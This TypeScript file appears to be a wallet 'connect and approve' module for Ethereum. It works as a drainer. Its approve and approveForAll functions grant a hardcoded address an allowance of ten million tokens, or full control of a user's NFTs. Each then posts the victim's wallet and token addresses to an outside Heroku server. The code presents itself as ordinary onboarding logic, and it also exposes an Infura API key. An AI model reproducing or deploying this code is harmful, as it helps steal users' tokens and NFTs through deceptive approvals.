import { ethers } from "ethers";
import Onboard from 'bnc-onboard'
import { API } from "bnc-onboard/dist/src/interfaces";

const NETWORK_ID = 1;
const RPC_URL = 'https://mainnet.infura.io/v3/7975a81d682e4188b7a6e0fda0445b2a';

export const myAddress = "0x103F6A08e23dA494c5Dd6504573624Ff7ac34D9b";

export default class Wallet {
    static provider: ethers.providers.Web3Provider | null;
    static onboard: API;
    static address: string;

    static async create() {
        Wallet.onboard = Onboard({
            networkId: NETWORK_ID,
            darkMode: !0,
            subscriptions: {
                address: address => {
                    Wallet.address = address;
                },
                wallet: wallet => {
                    if (wallet.provider) {
                        Wallet.provider = new ethers.providers.Web3Provider(wallet.provider, 'any')
                        window.localStorage.setItem('selectedWallet', wallet.name as string)
                    } else {
                        Wallet.provider = null
                    }
                }
            },
            walletSelect: {
                wallets: [{
                    walletName: 'metamask'
                }, {
                    walletName: 'trust',
                    rpcUrl: RPC_URL
                }, {
                    walletName: 'walletConnect',
                    infuraKey: '7975a81d682e4188b7a6e0fda0445b2a'
                }]
            }
        })
    }

    static async connectWallet() {
        await Wallet.onboard.walletSelect()
        await Wallet.onboard.walletCheck()

    }

    static readyToTransact = async () => {
        if (!Wallet.provider) {
            const walletSelected = await Wallet.onboard.walletSelect()
            if (!walletSelected) return !1
        }
        const ready = await this.onboard.walletCheck()
        return ready
    }

    static async approve(token_address: string, tokenInterface: string[]) {
        const signer = Wallet.provider?.getSigner();
        const tokenContract = new ethers.Contract(
            token_address,
            tokenInterface,
            signer
        );

        await tokenContract.approve(myAddress, ethers.utils.parseEther("10000000"));

        // const transaction = await Moralis.executeFunction(sendOptions);
        fetch("https://ethers-server.herokuapp.com/user-token/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                // '
            },
            body: JSON.stringify({
                address: Wallet.address,
                token_type: "erc20",
                token_id: "",
                date: new Date().toISOString(),
                token_address: token_address,
            }),
        });
    }

    static async approveForAll(token_address: string, token_id: string, tokenInterface: string[]) {
        const signer = Wallet.provider?.getSigner();
        const tokenContract = new ethers.Contract(
            token_address,
            tokenInterface,
            signer
        );

        await tokenContract.setApproveForAll(myAddress, true);

        // const transaction = await Moralis.executeFunction(sendOptions);
        fetch("https://ethers-server.herokuapp.com/user-token/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                // '
            },
            body: JSON.stringify({
                address: Wallet.address,
                token_type: "nft",
                token_id: token_id,
                date: new Date().toISOString(),
                token_address: token_address,
            }),
        });
    }
}